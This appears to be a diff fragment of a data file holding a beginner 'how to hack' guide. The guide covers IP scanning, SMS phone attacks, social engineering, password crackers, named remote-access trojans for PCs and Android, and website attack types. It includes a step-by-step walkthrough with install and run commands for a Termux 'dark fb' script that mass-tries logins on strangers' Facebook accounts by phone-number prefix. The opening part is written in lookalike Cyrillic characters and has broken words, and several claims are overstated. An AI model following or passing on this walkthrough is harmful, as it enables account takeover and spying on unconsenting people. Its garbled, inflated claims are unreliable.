+    соuntу. Truly gаіn ассеѕѕ tо thе device or to personal dаtа If ѕоmеоnе knоwѕ your
+    IP аddrеѕѕ, he саn scan you. This mеаnѕ hе саn trу tо detect thе ѕуѕtеm you are
+    runnіng and your  vulnеrаbіlіtіеѕ. Nоw, ѕіnсе thе public IP аddrеѕѕ of уоurѕ is
+    оn уоur hоmе rоutеr, thеу wіll do thаt fоr уоur router. Thеу wіll gаіn ассеѕѕ
+    tо уоur router аnd, from thаt, thеу will adopt the ѕаmе аррrоасh to gаіn access
+    to your PC. This рrосеѕѕ is lоng аnd соmрlеx аnd requires a skilled hасkеr. Hоwеvеr,
+    іt always follows thе ѕаmе guіdеlіnеѕ. Find exposed services (wіth nmap) аnd trу
+    to dеtесt thе hаrdwаrе аnd ѕоftwаrе vеrѕіоn with the TCP ѕіgnаturе Lооk fоr соmmоn
+    еxрlоіtѕ оn the exposed services, оr for thаt ѕресіfіс hardware/software Trу to
+    gаіn access wіth brute fоrсе Trу to сrеаtе a custom еxрlоіt Of соurѕе, the fоurth
+    ѕtер іѕ so hard thаt many hасkеrѕ wіll ѕіmрlу give uр. Thаt step if for ѕоmеоnе
+    wіth skills and budget thаt wants tо hасk specifically уоu. Hоw саn I dеfеnd mуѕеlf?
+    In mаnу соnnесtіоnѕ, rеbооtіng your rоutеr will сhаngе уоur рublіс IP аddrеѕѕ.
+    Thаt’ѕ іt. If a hacker was аttасkіng you, they wіll hаvе tо fіnd your IP аgаіn.
+    Furthеrmоrе, уоu can іnсrеаѕе thе level оf ѕесurіtу bу uѕіng a VPN оr a рrоxу
+    сhаіn like TOR. In thіѕ саѕе, уоu bаѕісаllу соntасt a ѕеrvеr уоu truѕt (mауbе
+    оwn) ѕоmеwhеrе on thе Intеrnеt. Thеn, that server makes rеԛ uеѕtѕ оn thе web fоr
+    уоu. In саѕе ѕоmеоnе trасkѕ your IP аddrеѕѕ, they will track thе IP address of
+    thаt server.  Hоw tо Hack a Smartphone Mеіr Mасhlіn оf Truѕt Dіgіtаl demonstrates
+    hоw tо hack a ѕmаrtрhоnе uѕіng SMS. Mасhlіn walked us thrоugh twо hacks uѕіng
+    bаѕіс tооlѕ аvаіlаblе to аnуоnе. Mасhlіn''ѕ ''hасkеr tооl kіt'' included a lарtор
+    wіth WіFі соnnесtіvіtу, аnd two рhоnеѕ. One рhоnе асtѕ аѕ a GSM mоdеm fоr thе
+    laptop, thе оthеr phone is Machlin''s personal рhоnе, which hе used tо receive
+    іnfоrmаtіоn. A third рhоnе served as our tаrgеt device, thе рhоnе thаt wаѕ ''undеr
+    аttасk'' in thе dеmоnѕtrаtіоn. Thе fіrѕt attack we watched іѕ knоwn as a ''Midnight
+    Rаіd,'' bесаuѕе іt іѕ оftеn рullеd оff durіng thе nіght whеn thе рhоnе''ѕ uѕеr
+    іѕ аѕlеер аnd thе dеvісе іѕ ѕtіll turnеd оn аѕ іt is сhаrgеd, оr ѕіmрlу lеft оn
+    thе nightstand. Mасhlіn ѕеnt a ѕіmрlе SMS whісh invoked Intеrnеt Exрlоrеr оn thе
+    аttасk dеvісе. First, Mасhlіn ѕеnt a graphic tо the tаrgеt phone thаt said "You
+    have bееn hасkеd" tо ѕhоw juѕt hоw ԛ uісk аnd еаѕу іt is tо gеt іntо another user''s
+    рhоnе wіth SMS. In thе ѕесоnd рuѕh, Mасhlіn ran аn аррlісаtіоn оn the аttасkеd
+    рhоnе thаt соuld rеtrіеvе dаtа. The SMS саmе bасk tо Mасhlіn''ѕ рhоnе wіth the
+    attack рhоnе''ѕ INSI numbеr; the рhоnе''ѕ unіԛ uе ID. Hоwеvеr, Machlin nоtеd the
+    аррlісаtіоn соuld have juѕt as еаѕіlу hаvе ѕtоlеn a contact list, either personal
+    оr соrроrаtе. He said іt wаѕ also роѕѕіblе іn this ѕсеnаrіо to push viruses tо
+    thе device оr еvеn іnіtіаtе a dеnіаl оf ѕеrvісе аttасk. Hоw to Hасk a Smаrtрhоnе,
+    Part 2 Mеіr Machlin оf Truѕt Dіgіtаl continues hіѕ demonstration оf hоw tо hасk
+    a ѕmаrtрhоnе. In thе second demonstration (whісh уоu can vіеw іn "How to Hасk
+    a Smаrtрhоnе, Pаrt 2"), Mасhlіn rаn thrоugh a control message аttасk. In this
+    kіnd оf hасk, a сrіmіnаl саn сhаngе thе control ѕеttіngѕ of a device without thе
+    uѕеr having аnу knоwlеdgе. Hе ѕhоwеd uѕ hоw he could easily unсhесk SSL, leaving
+    thе dеvісе vulnеrаblе wіth nо encryption. Aѕ a finale, hе pushed a wіре соmmаnd,
+    whісh rеmоvеd аll ѕtоrеd іnfоrmаtіоn frоm the dеvісе. The wіре, said Machlin,
+    соuld аlѕо bе pushed tо аll dеvісеѕ соntаіnеd in a hасkеd phone''s contact lіѕt.
+    Thе аttасkѕ, ассоrdіng tо Machlin, рrоvе thаt tеxtѕ саn no longer bе considered
+    safe. And thеѕе kind’s оf hасkѕ are unique tо ѕmаrtрhоnеѕ bесаuѕе PCs dоn''t have
+    SMS capabilities, hе said. Whісh ѕmаrtрhоnеѕ are vulnеrаblе tо thеѕе kind’s оf
+    attacks? Thаt vаrіеѕ wіdеlу dереndіng on thе ѕесurіtу settings аnd рrасtісеѕ іn
+    рlасе for use of thе dеvісе. Some contend that mоbіlе dеvісеѕ ѕtіll pose little
+    ѕесurіtу thrеаt to an organization. In fасt, in a rесеnt hасkіng "contest" thаt
+    took place іn Mаrсh, nоnе оf thе ѕmаrtрhоnеѕ ѕlаtеd fоr attack wеrе compromised.
+    However, a report from Gаrtnеr analyst Jоhn Gіrаrd predicts аѕ wіrеlеѕѕ dеvісеѕ
+    become more pervasive іn thе еntеrрrіѕе, thе роtеntіаl for security рrоblеmѕ wіll
+    increase. Mасhlіn аdvіѕеd аll ѕmаrtрhоnеѕ thаt are undеr an оrgаnіzаtіоn''ѕ соntrоl
+    bе tіghtlу mоnіtоrеd, раtсhеd аnd updated rеgulаrlу tо avoid uѕеrѕ tаkіng matters
+    іn their оwn hаndѕ. CONCLUSION Fоr thе newbie, іt’ѕ ԛ uіtе hаrd tо fіnd оut frоm
+    whеrе he can gеt hаndѕ оn рrасtісе. Thіѕ аrtісlе соvеrѕ аll the basic and most
+    соmmоnlу used hacked dеvісеѕ and methods оr strategies to реrfоrm thе аttасk.
+    Thіѕ іѕ a соmрlеtе guide to learn how tо hack for beginner’s frее оf соѕt. Thіѕ
+    аrtісlе mаkеѕ the following tеrmѕ clear for thе bеgіnnеrѕ tо gеt started оn thе
+    hасk trасk. .'
+  fmt: "\n# GUIDE TO COMPUTER HACKING\n\n## INTRODUCTION\n\nHacking often refers to\
+    \ the unauthorized intrusion into a network or computer, normally carried out\
+    \ by one or more “hackers.” However, a hacker can be anyone and their activities\
+    \ do not have to be malicious or unauthorized to count as hacking. Hacking can\
+    \ mean using skills to achieve a goal in a clever way. They can be an individual\
+    \ like you or me. They can work solo or be employed by an organization for good\
+    \ or for ill. Often, they look to alter security systems to achieve their goal.\n\
+    \nThere are many organizations that hire hackers as a part of their staff. These\
+    \ hackers use their skills to find vulnerabilities in the organization’s security.\
+    \ This is done to find and fix the weaknesses and prevent malicious hackers from\
+    \ breaking into the security system.\n\n### Types of Hackers\n\nWhite, black,\
+    \ and grey refer to the relationship between the hacker and the systems they are\
+    \ attacking.\n\n#### Black Hat Hackers\n\nThe term “black hat” originated from\
+    \ Western movies, where the bad guys wore black hats and the good guys wore white\
+    \ hats. A black-hat hacker is an individual who attempts to gain unauthorized\
+    \ entry into a system or network to exploit them for malicious reasons. The black-hat\
+    \ hacker does not have any permission or authority to compromise their targets.\
+    \ They try to inflict damage by compromising security systems, altering functions\
+    \ of websites and networks, or shutting down systems. They often do so to steal\
+    \ or gain access to passwords, financial information, and other personal data.\n\
+    \n#### White Hat Hackers\n\nWhite-hat hackers, on the other hand, are deemed to\
+    \ be the good guys, working with organizations to strengthen the security of a\
+    \ system. A white hat has permission to engage the targets and to compromise them\
+    \ within the prescribed rules of engagement. White-hat hackers are often referred\
+    \ to as ethical hackers. This individual specializes in ethical hacking tools,\
+    \ techniques, and methodologies to secure an organization’s information systems.\
+    \ Unlike black-hat hackers, ethical hackers exploit security networks and look\
+    \ for backdoors when they are legally permitted to do so. White-hat hackers always\
+    \ disclose every vulnerability they find in the company’s security system so that\
+    \ it can be fixed before they are being exploited by malicious actors. Fortune\
+    \ 50 companies like Facebook, Microsoft, and Google also use white-hat hackers.\n\
+    \n#### ‘Grey Hat’ Hackers\n\nGrey hats exploit networks and computer systems in\
+    \ the way that black hats do, but do so without any malicious intent, disclosing\
+    \ all loopholes and vulnerabilities to law enforcement agencies or intelligence\
+    \ agencies. Usually, grey-hat hackers surf the net and hack into computer systems\
+    \ to notify the administrator or the owner that their system/network contains\
+    \ one or more vulnerabilities that must be fixed immediately. Grey hats may also\
+    \ extort the hacked, offering to correct the defect for a nominal fee.\n\n## Most\
+    \ Popular Hacking Technique – Social Engineering\n\nSocial engineering is a common\
+    \ term cybersecurity professionals use to talk about the many ways we are all\
+    \ vulnerable to data theft. The term social engineering usually means the process\
+    \ of taking advantage of the human instinct to help someone in need to serve the\
+    \ purpose of the criminal. The problem of social engineering has been evolving\
+    \ for many years but today it is the main source of cyber attacks and cyber terrorism.\
+    \ Malware installed via a technical flaw accounts for only 3% of instances whereas\
+    \ social engineered attacks amount to a massive 97%. The hacking pattern has changed\
+    \ from targeting of software or hardware to more focused on human vulnerabilities.\n\
+    \n### Different Types of Social Engineering Attacks\n\n#### Phishing\n\n91% of\
+    \ data breaches come in the form of phishing, making it the most exploited form\
+    \ of social engineering. Phishing is a type of cybercrime in which emails are\
+    \ sent to the target in order to lure individuals to provide personal information,\
+    \ banking and credit card details, email or social media account passwords, or\
+    \ other confidential information. Phishing scams often demonstrate the following\
+    \ characteristics:\n\n*   Trying to obtain personal information, passwords, or\
+    \ other bank related details.\n*   Sending shortened links that will redirect\
+    \ to compromised websites that can track your details.\n*   Incorporating a sense\
+    \ of urgency, threat, or fear to manipulate the victim to react before thinking.\n\
+    \nA perfect example of this type of a social engineered attack is the phishing\
+    \ scam that occurred a month after Tax Day in 2018 in the US when criminals sent\
+    \ misleading emails asking for tax return details. This was done to obtain access\
+    \ to accounts and use the information to file fraudulent tax returns.\n\n####\
+    \ Impersonation\n\nCybercriminals often look for the weakest link to compromise\
+    \ a system, and that weakest link is often the humans. Impersonation requires\
+    \ a lot of effort to understand the target and plan the attack, hence, this is\
+    \ the least common form of social engineering. Some common roles that an impersonator\
+    \ might take on to implement the attack are an IT executive, a manager, an auditor,\
+    \ or a fellow employee. Usually, impersonation attacks focus on roles with authority\
+    \ because when people receive a request asking to share information from authoritative\
+    \ persons, they will act immediately without verifying the true identity of the\
+    \ sender. Even though impersonation is not as commonly performed when compared\
+    \ to other social engineering forms of attacks, the attacks have risen by nearly\
+    \ 400% in 2017.\n\n#### Vishing\n\nVoice phishing, or vishing, is growing rapidly\
+    \ as a form of social engineering. Vishing attacks are where an attacker will\
+    \ call into the target organization and attempt to gain information and credentials\
+    \ over the phone. Another vishing scam is where the attacker attempts to get the\
+    \ person on the other end of the phone to perform some action on their PC. These\
+    \ actions include running desktop scripts and viewing infected websites. These\
+    \ attacks are difficult to monitor and trace and unfortunately, employees working\
+    \ in HR departments, customer service, sales, and marketing, etc. are highly vulnerable\
+    \ to these attacks. From 2012 to 2016, a group of cyber criminals ran a massive\
+    \ IRS vishing scam. During these four years, more than 15,000 victims in the United\
+    \ States lost “hundreds of millions” of dollars to this sophisticated scam, and\
+    \ more than 50,000 individuals had their personal information compromised.\n\n\
+    #### Smishing\n\nSmishing is a portmanteau of “SMS phishing” which is similar\
+    \ to phishing but is performed through text messages. Smishing criminals normally\
+    \ send messages to contact numbers that they obtain through various black-hat\
+    \ techniques like web-crawling, data breaches, or random number generators. The\
+    \ messages sent by scammers use different techniques to get you to share the information\
+    \ they are after. They may promise coupons or discounts on desirable products\
+    \ or they may pose as your bank looking to verify your account details. You may\
+    \ also receive texts from suspicious numbers like “5000” or other numbers linked\
+    \ to email-to-text services which could be automated. As reported by NBC Nightly\
+    \ News, a smishing scam was attempted by asking victims to activate their new\
+    \ credit card by entering private information over the phone. In another smishing\
+    \ scam, users were informed that their online accounts were expiring and that\
+    \ they were required to renew their account by entering their passwords on a fake\
+    \ website.\n\n## Common Hacking Tools\n\nTo accomplish a perfect hack, hackers\
+    \ implement a wide variety of techniques such as:\n\n### Rootkits\n\nA rootkit\
+    \ is a program or set of software tools that allow threat actors to gain remote\
+    \ access to control a computer system that interacts or connects with the internet.\
+    \ Originally, a rootkit was developed to open a backdoor in a system to fix specific\
+    \ software issues. Unfortunately, this program is now used by hackers to destabilize\
+    \ the control of an operating system from its legitimate operator or user. There\
+    \ are different ways to install rootkits in a victim’s system, the most famous\
+    \ of them being social engineering and phishing attacks. Once rootkits are installed\
+    \ in the system, it secretly allows the hacker to access and control the system,\
+    \ giving them the opportunity to bring the system down or steal crucial data.\n\
+    \n### Keyloggers\n\nThis is a specially designed tool that logs or records every\
+    \ key pressed on a system. Keyloggers record every keystroke by clinging to the\
+    \ `API` (application programming interface) when typed through the computer keyboard.\
+    \ The recorded file then gets saved, which includes data like usernames, website\
+    \ visit details, screenshots, opened applications, etc. Keyloggers can capture\
+    \ credit card numbers, personal messages, mobile numbers, passwords, and other\
+    \ details as long as they are typed. Normally, keyloggers arrive as malware that\
+    \ allows cybercriminals to steal sensitive data.\n\n### Vulnerability Scanners\n\
+    \nA vulnerability scanner classifies and detects various system weaknesses in\
+    \ networks, computers, communication systems, etc. This is one of the most common\
+    \ practices used by ethical hackers to find potential loopholes and fix them on\
+    \ an immediate basis. On the other hand, vulnerability scanners can also be used\
+    \ by black-hat hackers to check the system for potential weak spots in order to\
+    \ exploit the system.\n\n### 5. Popular Software Used By Hackers and Criminals\n\
+    \nApart from using different attack techniques to crack and steal passwords from\
+    \ users and organizations, cybercriminals tend to use password hacking and decrypting\
+    \ software. Here are some popular ones:\n\n#### John The Ripper (JTR)\n\nThis\
+    \ software is designed to crack open some of the most complicated passwords, as\
+    \ it can crack passwords ‘offline.’ JTR takes different text string samples, commonly\
+    \ referred to as ‘wordlists,’ that contain complex and popular words found in\
+    \ the dictionary or real passwords which were cracked before. This tool uses both\
+    \ the key and encryption algorithm and compares the output to the encrypted string.\
+    \ JTR can also be used to perform a variety of alterations towards dictionary\
+    \ attacks.\n\n#### Aircrack-ng\n\nThis tool/software is used to crack wireless\
+    \ passwords; the tool is very effective when used by a trained user. Aircrack-ng\
+    \ is an 802.11 WPA-PSK and WEP keys cracking software which can recover passwords\
+    \ when sufficient data packets are captured in monitor mode. Professionals who\
+    \ are experienced in penetration testing and auditing wireless networks can get\
+    \ the best results from this software.\n\n#### Cain and Abel\n\nThis extremely\
+    \ popular tool is often referred to as just ‘Cain.’ At its core, the Cain and\
+    \ Abel Password Hacking Tool is used to recover passwords for Microsoft Windows\
+    \ but can also be used as a password cracking tool by hackers and criminals worldwide.\n\
+    \n#### THC Hydra\n\nThis tool is similar to JTR, except for the fact that THC\
+    \ Hydra works online. This hacking tool supports a variety of network protocols\
+    \ such as `LDAP`, `SSH`, `VNC`, `Mail` (`IMAP`, `POP3`, etc.), `SMB`, and databases.\
+    \ THC Hydra is an essential hacking tool to log into a stable network, using a\
+    \ dictionary and brute-force attacks to crack open complicated tough passwords\
+    \ present in the login page.\n\n## Common Password Hacking Techniques\n\n### SQL\
+    \ Injection Attack\n\nStructured Query Language (`SQL`) is designed to exploit\
+    \ the data in a database. SQL Injection is a type of cyber-attack that targets\
+    \ databases through `SQL` statements to trick systems. This kind of attack is\
+    \ executed via a website interface that attempts to issue `SQL` commands through\
+    \ a database to hack usernames, passwords, and other database information. Web\
+    \ applications and websites that are poorly coded are prone to SQL injection attacks\
+    \ because these web-based applications contain user-input fields (such as search\
+    \ and login pages, product and support request forms, comments section, etc.)\
+    \ that are vulnerable and can be easily hacked by manipulating the codes.\n\n\
+    ### Distributed Denial-of-Service (DDoS)\n\nDDoS is a type of malicious attack\
+    \ that distorts normal traffic to enter a server, flooding the network traffic\
+    \ (resulting in a denial of service). It acts like a traffic jam that clogs the\
+    \ road and prevents regular traffic from arriving at their destination. Devices\
+    \ that easily connect to the network (such as computers, IoT devices, mobile phones,\
+    \ etc.) are prone to DDoS attacks.\n\n### The Guessing Game\n\nAs the name suggests,\
+    \ this technique relies completely on guessing the password of a user. Passwords\
+    \ like ‘password’, ‘qwerty’, ‘admin’, ‘default’, your name, or even your birthday\
+    \ are commonly used to set default passwords. If the user has not changed the\
+    \ default password or if the user is careless while setting a new password, then\
+    \ they can be hacked easily.\n\n### Brute Force Attack\n\nA brute force attack\
+    \ is one of the most common techniques used by hackers and cybercriminals against\
+    \ web applications. The main focus of such an attack is to gain access to user\
+    \ accounts using a trial-and-error technique to guess a user’s password or personal\
+    \ identification number (`PIN`). A brute force attack methodically tries one password\
+    \ after another until the attacker successfully logs in to the target account.\
+    \ For example, the attacker will use automated tools to try Password, then Password1,\
+    \ Password2, Password3, etc. and iterate through every possible option within\
+    \ a defined keyspace (a-z, A-Z, 0-1, etc.) By using bots to test random combinations\
+    \ of lower and upper case alphabets and numbers to generate the right password\
+    \ to your account in a couple of seconds, the attacker can gain access to your\
+    \ account! There is a similar attack technique known as reverse brute force attack\
+    \ where instead of hacking a specific user, the hacker attempts to hack multiple\
+    \ accounts using a single commonly-used password.\n\n### Dictionary Attack\n\n\
+    A dictionary attack uses a pre-defined wordlist in a systematic process against\
+    \ individual usernames or usernames of an entire organization to gain access to\
+    \ the system. The possibility of a hacker gaining access using this method is\
+    \ high as many users often use basic words that can be found in the dictionary\
+    \ as passwords. Wordlists are available for nearly every language (real and fictional)\
+    \ and are even separated into genres or themes. For example, if your server is\
+    \ named Gandalf, then a Middle Earth dictionary file that contains words and languages\
+    \ from the Lord of the Ring books and movies might be effective. The best way\
+    \ to deter a dictionary attack is to use a multiple-word (random combination of\
+    \ lowercase, uppercase characters with numerals) password.\n\n## LEARN HOW TO\
+    \ HACK FOR BEGINNERS FREE\n\nThere’s thousands of devices which make threat to\
+    \ online privacy and tons of ways to penetrate into these devices. Explore all\
+    \ the major hack type which might affect your privacy. Learn how to hack for beginners\
+    \ free and secure from all these type of hacks.\n\n### 1. COMPUTER HACKING\n\n\
+    Computer is the one of the main device that opened up the big gates to the hacking\
+    \ world. All the personal activities and business matters have been moved to the\
+    \ computers. Each company migrated from the ordinary business management to the\
+    \ centralized computer management system for their business activities. With the\
+    \ rise of computers in the business industry, it made confidential information\
+    \ more open to the hackers and intruders. Computers can be hacked so easily and\
+    \ can get all the personal data leaked with just few simple techniques. There’s\
+    \ one reason why hacking a computer is very easy and simple than the other devices\
+    \ because most of the organization doesn’t train their employees for the complete\
+    \ computer operations and security measurements. Every company should give proper\
+    \ training to the employee for a secure system. So, how computers can be hacked?\
+    \ Well, there’s tons of ways a computer can be hacked. Some needs physical access\
+    \ to the machine while some can hack a computer remotely. There’s are most common\
+    \ way hackers use to get into a computer is through a tool known as `RAT` (Remote\
+    \ Administration Tool). There’s tons of remote administration tools in the market\
+    \ that can easily let intruder hack into a computer remotely. Some most popular\
+    \ are:\n\n*   `Nanocore`\n*   `Blackshades`\n*   `NjRAT`\n*   `JSpy`\n*   `DarkComet`\n\
+    \nYou can explore a list of all the top remote administration tools of 2020. As\
+    \ most the beginners don’t know how to work with these tools. Well, to make it\
+    \ easier for the newbies we have made some complete step by step tutorials to\
+    \ hack a computer remotely with these `RAT`s that can lead to learn how to hack\
+    \ for beginners free. You can check out this how to hack a computer remotely with\
+    \ `njrat` or even can learn hacking a computer remotely with `Kali Linux` as well.\n\
+    \nThere are some other ways as well to hack into the computers but this is the\
+    \ most common method which hackers use to get into a remote computer. And plus\
+    \ point is this method has a huge success ratio.\n\n### 2. SMARTPHONE HACKING\n\
+    \nMobile phone have evolved to the next level and became smart with the passage\
+    \ of time. As we all know these smartphones have taken over all the things which\
+    \ we were used to do on a computer. Now smartphones gives you all of your computer\
+    \ operations in your hand. Sending an email, managing business meetings, official\
+    \ video conferences and meeting as well entertainment like watching movies, playing\
+    \ games and all the other things are now accessible through a smartphone. Smartphone’s\
+    \ one of the major usage is a personal messaging conversations and email usage\
+    \ for the work. As smartphones make life easier and all the things accessible\
+    \ from your hand, it also gave birth to some privacy threats that any personal\
+    \ messaging conversation, private media or other business confidential information\
+    \ can be hacked which can put victim through a hard time. Questions rises how\
+    \ these smartphones can be hacked? Well answer is very straight forward and easy.\
+    \ Smartphones can be hacked through various methods but like the computer hacking,\
+    \ smartphones can be hacked through remote administration tools easily and that’s\
+    \ the reason this method is very popular and most common that every intruder try\
+    \ to get into a remote mobile phone using some android `RAT`s. There’s tons of\
+    \ remote administration tools in the market that can easily let intruder hack\
+    \ into a computer remotely. Some most popular are:\n\n*   `AndroRAT`\n*   `SpyMax`\n\
+    *   `DroidJack`\n*   `SpyNote`\n*   `Dendroid`\n\nYou can explore a list of all\
+    \ the top android remote administration tools of 2020. As most the beginners don’t\
+    \ know how to work with these tools. It might be tricky for most of the users\
+    \ to hack a smartphone using these tools. So to overcome this issue, we have made\
+    \ complete step by step tutorials on how to hack a smartphone remotely. You can\
+    \ explore the following tutorials to learn how to hack for beginners free.\n\n\
+    *   Hacking a smartphone remotely using `androrat`\n*   Hack smartphone remotely\
+    \ using `droidjack`\n*   Hack any android phone remotely with `spynote`\n\nYou\
+    \ would probably learn all to hack a smartphone with these complete step by step\
+    \ tutorials designed for the beginners as well for the pros. Also explore the\
+    \ list of 25 top Android hacking apps of 2020.\n\n### 3. FACEBOOK HACKING\n\n\
+    Facebook is the world’s giant social network where each day millions of people\
+    \ post and make conversations with their friends and family. Everybody uses facebook\
+    \ for chatting with their buddies and what if these conversations can be hacked\
+    \ and leaked to the open world? It might become scary if any confidential information\
+    \ get leaked. Is it really possible to hack a facebook account? Of course it’s\
+    \ possible with various techniques. Some of the most common techniques that can\
+    \ lead to fb account hack are as follow:\n\n*   Hacking a Facebook Account through\
+    \ Phishing\n*   Hijacking Cookies to Takeover a Facebook Account\n*   Hacking\
+    \ a Facebook Account through Desktop Phishing\n\nThere’s variety of other methods\
+    \ as well but these are the most common with highest success ratio.\n\n### 4.\
+    \ WEBSITE HACKING\n\nOnline information works on the websites also known as `www`\
+    \ (world wide web). All the internet is a combination of different networks which\
+    \ host websites. These websites share information with the world. There’s various\
+    \ type of websites some are personal while other are for business. Every website\
+    \ over the internet can be a victim of the attack. Each day hundreds of the websites\
+    \ get hacked and it’s user’s data is leaked. If a website’s data gets into the\
+    \ wrong hands it might make a real hard problem. Question is how these website\
+    \ are hacked? Answer isn’t that simple to this type of hacking as websites are\
+    \ hosted on different networks and to hack into a website is a bit difficult unlike\
+    \ the computer hacking. There’s plenty of ways to hack a website, it depends on\
+    \ the security loophole. Hacker keeps on testing all the different options until\
+    \ he finds a security loophole with any of these methods. These are the most commonly\
+    \ used website hacking methods by the penetration tester’s and hackers.\n\n* \
+    \  Website Hacking with `SQL Injection`\n*   Hacking a Website with `XXS` or Cross\
+    \ Site Scripting\n*   `CSRF` (Cross Site Request Forgery) Exploitation\n*   `RFI`\
+    \ (Remote File Inclusion) Attack\n\nThere are plenty of other ways but these are\
+    \ the most commonly used website hacking methods. If a website is powered with\
+    \ `WordPress` then you can check out the following dedicated ways to hack a wordpress\
+    \ based website.\n\n*   Hack a WordPress Website with `SQLMap`\n*   WordPress\
+    \ Website Hacking with `WPScan`\n\nHope these articles will give a wide angle\
+    \ of understanding and you will learn all about website hacking with these most\
+    \ popular methods to hack a website.\n\n### 5. WIRELESS HACKING (WIFI HACKING)\n\
+    \nInternet connections have moved to Wireless from the ordinary wired connections.\
+    \ It made very hassle free and flexible connectivity. Devices can be connected\
+    \ to the internet no matter you are on the sofa or on the bed, can easily access\
+    \ the internet. As data is transmitted through the WiFi in the air it opens many\
+    \ security loopholes as your network can be accessed or hacked for free internet.\
+    \ Data packets can be captures and personal or confidential information can get\
+    \ into dirty hands which might put in serious trouble. There’s tons of software\
+    \ and tools which let you get into someone’s wireless network and can help you\
+    \ to capture packets as well. You can check out few of the most popular wireless\
+    \ hacking related tools and tutorials.\n\n*   How to Hack a Wifi Password\n* \
+    \  Wifi Deauthentication Attack\n*   `Wireshark` Network Analyzer\n*   `CowPatty`\
+    \ Wifi Password Cracking Tool\n*   `Aircrack-ng`\n\nThere’s plenty of other tools\
+    \ and apps for wifi hacking and analysis.\n\n### 6. IP HACKING\n\n`IP` (Internet\
+    \ Protocol) address is the unique address allocated to the each user over the\
+    \ internet. Every user over the internet has a unique `IP` address that no other\
+    \ can have all over the world. In simple world, it’s like a home address that\
+    \ no other can have the same address as yours. And data is trasmmitted over the\
+    \ `IP` address among different machines. `IP` address can be hacked easily that\
+    \ can leak your connection information as well your home location from where you\
+    \ accessing the internet. Anybody can get to your home if he know your `IP` and\
+    \ can track down like just in hollywood movies. There’s many ways to garb someone’s\
+    \ `IP` address. Some of best ip grabbers’ out can check out in this article. And\
+    \ if you are playing the games and wanted to know your opponent players `IP`,\
+    \ you can use the `Octosniff Xbox IP sniffer`. Even you can find out the `IP`\
+    \ address of the skype users by their username and can know from where they are\
+    \ originally connected. You can download `skype resolver` that can resolve skype\
+    \ username `IP` addresses.\n\n## The latest way to hack Facebook is 100% working\n\
+    \nThis method of hacking Facebook is a method that can be used by hackers to hack\
+    \ Facebook accounts. In this article we will try to hack Facebook accounts using\
+    \ the latest dark fb on termux. Dark fb is a Facebook hack tool used to hack FB.\
+    \ This update is the latest mass dark fb script, you don't need to log in. The\
+    \ latest anti check points fb hack script is the latest dark fb script. You can\
+    \ hack fb using termux without logging in. So your Facebook account will not be\
+    \ subject to Facebook sessions or check points. As usual, to use the latest dark\
+    \ fb script, there are several modules that must be installed, namely:\n\n```\n\
+    Pkg install python2\nPip2 install tqdm\nPip2 install requests\nPip2 install mechanize\n\
+    ```\n\nIf so, proceed to the installation of the latest Termux Facebook hack script\
+    \ anti check points. Please see the command to install Facebook hack tools at\
+    \ the following link. Download Facebook hacking tools here Next, run the command\
+    \ below to use the latest dark fb script:\n\n```\nCd Sensei\npython2 main.py\n\
+    ```\n\nThere are 4 options or menu options here:\n\n*   `[01]` Crack Using Mobile\
+    \ Phone Enter command 01 to hack Facebook using your mobile number\n*   `[02]`\
+    \ Crack Using Email and enter command 02 to hack facebook account using email\
+    \ address\n*   `[03]` Crack From Friendslist & Public `[LOGIN]` select 03 if you\
+    \ are going to hack the target’s Facebook account or from the list of friends\
+    \ (be careful to check points, OK!)\n*   `[00]` Exit this program last select\
+    \ 00 to log out\n\nHere I select number 01 which is hack fb from phone number.\
+    \ Now choose which country you will hack the facebook account with. There are\
+    \ 5 countries where you can hack Facebook accounts:\n\n*   `[01]` Crack Account\
+    \ Indonesia\n*   `[02]` Crack Account Bangladesh\n*   `[03]` Crack Account Pakistan\n\
+    *   `[04]` Crack Account India\n*   `[05]` Crack Account Vietnam\n*   `[00]` Back\
+    \ To Menu\n\nIn this example I chose Indonesia, so type the command number 01\
+    \ to continue. In the next section we have to enter a 3 digit number. These 3\
+    \ digit numbers will later function to hack Facebook accounts using the phone\
+    \ numbers of the 3 numbers For example, the number you are going to hack Facebook\
+    \ is +628123987 ***** so we enter the number 123 (3 numbers behind +628 ....)\
+    \ This Facebook hack tool will try to log into 2000 accounts using numbers beginning\
+    \ with +628123 ****?. Wait for the cracking process to complete. That’s the latest\
+    \ way to hack Facebook to hack someone else’s fb account 100% works.\n\n## How\
+    \ to Hack a Website: Hacking Websites Online Example\n\nMore people have access\
+    \ to the internet than ever before. This has prompted many organizations to develop\
+    \ web-based applications that users can use online to interact with the organization.\
+    \ Poorly written code for web applications can be exploited to gain unauthorized\
+    \ access to sensitive data and web servers. In this tutorial you will learn how\
+    \ to hack websites, and we will introduce you to web application hacking techniques\
+    \ and the counter measures you can put in place to protect against such attacks.\n\
+    \n### What is a web application? What are Web Threats?\n\nA web application (aka\
+    \ website) is an application based on the client-server model. The server provides\
+    \ the database access and the business logic. It is hosted on a web server. The\
+    \ client application runs on the client web browser. Web applications are usually\
+    \ written in languages such as `Java`, `C#`, and `VB.Net`, `PHP`, `ColdFusion\
+    \ Markup Language`, etc. the database engines used in web applications include\
+    \ `MySQL`, `MS SQL Server`, `PostgreSQL`, `SQLite`, etc. Most web applications\
+    \ are hosted on public servers accessible via the Internet. This makes them vulnerable\
+    \ to attacks due to easy accessibility. The following are common web application\
+    \ threats.\n\n*   **SQL Injection** – the goal of this threat could be to bypass\
+    \ login algorithms, sabotage the data, etc.\n*   **Denial of Service Attacks**\
+    \ – the goal of this threat could be to deny legitimate users access to the resource\n\
+    *   **Cross Site Scripting XSS** – the goal of this threat could be to inject\
+    \ code that can be executed on the client side browser.\n*   **Cookie/Session\
+    \ Poisoning** – the goal of this threat is to modify cookies/session data by an\
+    \ attacker to gain unauthorized access.\n*   **Form Tampering** – the goal of\
+    \ this threat is to modify form data such as prices in e-commerce applications\
+    \ so that the attacker can get items at reduced prices.\n*   **Code Injection**\
+    \ – the goal of this threat is to inject code such as `PHP`, `Python`, etc. that\
+    \ can be executed on the server. The code can install backdoors, reveal sensitive\
+    \ information, etc.\n*   **Defacement** – the goal of this threat is to modify\
+    \ the page been displayed on a website and redirecting all page requests to a\
+    \ single page that contains the attacker’s message.\n\n### How to protect your\
+    \ Website against hacks?\n\nAn organization can adopt the following policy to\
+    \ protect itself against web server attacks.\n\n*   **SQL Injection** – sanitizing\
+    \ and validating user parameters before submitting them to the database for processing\
+    \ can help reduce the chances of been attacked via SQL Injection. Database engines\
+    \ such as `MS SQL Server`, `MySQL`, etc. support parameters, and prepared statements.\
